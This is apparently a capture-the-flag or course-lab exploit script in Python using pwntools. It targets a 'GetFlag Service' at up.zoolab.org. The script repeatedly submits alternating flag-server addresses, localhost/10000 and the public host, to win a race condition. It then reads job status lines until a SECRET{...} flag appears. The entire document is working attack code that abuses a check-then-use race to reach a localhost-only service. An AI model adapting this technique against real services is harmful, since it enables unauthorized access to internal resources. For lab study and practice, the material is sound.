from pwn import remote
import time

HOST = 'up.zoolab.org'
PORT = 10932

r = remote(HOST, PORT)
r.recvuntil(b'Welcome to the GetFlag Service!')

while True:
    # send a few racing jobs
    for _ in range(5):
        # localhost
        r.sendline(b'g')
        r.recvuntil(b'Enter flag server addr/port: ')
        r.sendline(b'localhost/10000')
        # real host
        r.sendline(b'g')
        r.recvuntil(b'Enter flag server addr/port: ')
        r.sendline(b'up.zoolab.org/10000')

        # small nudge, optional
        # time.sleep(0.005)

    # check status
    r.sendline(b'v')
    r.recvuntil(b'==== Job Status ====\n')
    status1 = r.recvline().decode().strip()
    status2 = r.recvline().decode().strip()
    status3 = r.recvline().decode().strip()
    print(status2)
    print(status3)

    # look for the secret
    if '{' in status2 or '{' in status3:
        print("\n🎉 Got secret:", status1 if 'SECRET{' in status1 else status2)
        break

r.close()
